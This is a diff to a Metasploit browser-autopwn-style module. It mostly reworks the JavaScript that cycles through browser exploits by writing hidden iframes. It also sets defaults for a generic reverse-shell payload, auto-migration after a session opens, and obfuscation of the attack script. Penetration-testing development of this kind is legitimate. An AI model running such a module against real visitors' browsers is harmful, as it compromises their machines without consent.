@@ -60,6 +60,11 @@ class Metasploit3 < Msf::Auxiliary
 				],
 			'PassiveActions' =>
 				[ 'WebServer', 'DefangedDetection' ],
+			'DefaultOptions' => {
+					# We know that most of these exploits will crash the browser, so
+					# set the default to run migrate right away if possible.
+					"InitialAutoRunScript" => "migrate -f",
+				},
 			'DefaultAction'  => 'WebServer'))
 
 		register_options([
@@ -69,9 +74,6 @@ class Metasploit3 < Msf::Auxiliary
 		], self.class)
 
 		register_advanced_options([
-			# We know that most of these exploits will crash the browser, so
-			# set the default to run migrate right away if possible.
-			OptString.new('InitialAutoRunScript', [false, "An initial script to run on session created (before AutoRunScript)",  'migrate -f']),
 			OptString.new('AutoRunScript', [false, "A script to automatically on session creation.", '']),
 			OptBool.new('AutoSystemInfo', [true, "Automatically capture system information on initialization.", true]),
 			OptString.new('MATCH', [false,
@@ -109,7 +111,7 @@ class Metasploit3 < Msf::Auxiliary
 				'The port to use for generic reverse-connect payloads', 6666
 			]),
 			OptString.new('PAYLOAD_GENERIC', [false,
-				'The payload to use for generic reverse-connect payloads6',
+				'The payload to use for generic reverse-connect payloads',
 				'generic/shell_reverse_tcp'
 			]),
 			OptPort.new('LPORT_JAVA', [false,
@@ -697,7 +699,7 @@ class Metasploit3 < Msf::Auxiliary
 		# Generic stuff that is needed regardless of what browser was detected.
 		js << <<-ENDJS
 			var written_iframes = new Array();
-			function write_iframe(myframe) {
+			window.write_iframe = function (myframe) {
 				var iframe_idx; var mybody;
 				for (iframe_idx in written_iframes) {
 					if (written_iframes[iframe_idx] == myframe) {
@@ -708,14 +710,14 @@ class Metasploit3 < Msf::Auxiliary
 				str = '';
 				str += '<iframe src="' + myframe + '" style="visibility:hidden" height="0" width="0" border="0"></iframe>';
 				document.body.innerHTML += (str);
-			}
-			function next_exploit(exploit_idx) {
-				#{js_debug("'next_exploit(' + exploit_idx +')'")}
+			};
+			window.next_exploit = function(exploit_idx) {
+				#{js_debug("'next_exploit(' + exploit_idx +')<br>'")}
 				if (!global_exploit_list[exploit_idx]) {
 					#{js_debug("'End'")}
 					return;
 				}
-				#{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + '<br>'")}
+				#{js_debug("'trying ' + global_exploit_list[exploit_idx].resource + ' of ' + global_exploit_list.length + '<br>'")}
 				// Wrap all of the vuln tests in a try-catch block so a
 				// single borked test doesn't prevent other exploits
 				// from working.
@@ -731,6 +733,7 @@ class Metasploit3 < Msf::Auxiliary
 						#{js_debug("'test says it is vuln, writing iframe for ' + global_exploit_list[exploit_idx].resource + '<br>'")}
 						write_iframe(global_exploit_list[exploit_idx].resource);
 						setTimeout("next_exploit(" + (exploit_idx+1).toString() + ")", 1000);
+						//alert("next_exploit(" + (exploit_idx+1).toString() + ")");
 					} else {
 						#{js_debug("'this client does not appear to be vulnerable to ' + global_exploit_list[exploit_idx].resource + '<br>'")}
 						next_exploit(exploit_idx+1);
@@ -739,7 +742,7 @@ class Metasploit3 < Msf::Auxiliary
 					#{js_debug("'test threw an exception, trying next one'")}
 					next_exploit(exploit_idx+1);
 				};
-			}
+			};
 		ENDJS
 
 		# if we have no client_info, this will add all tests. Otherwise tries
@@ -809,10 +812,10 @@ class Metasploit3 < Msf::Auxiliary
 		js << %Q|document.body.appendChild(noscript_div);\n|
 
 		js << "#{js_debug("'starting exploits<br>'")}\n"
-		js << "next_exploit(0);\n"
+		js << "window.next_exploit(0);\n"
 
 		js = ::Rex::Exploitation::JSObfu.new(js)
-		js.obfuscate
+		js.obfuscate unless datastore["DEBUG"]
 
 		response.body = "#{js}"
 
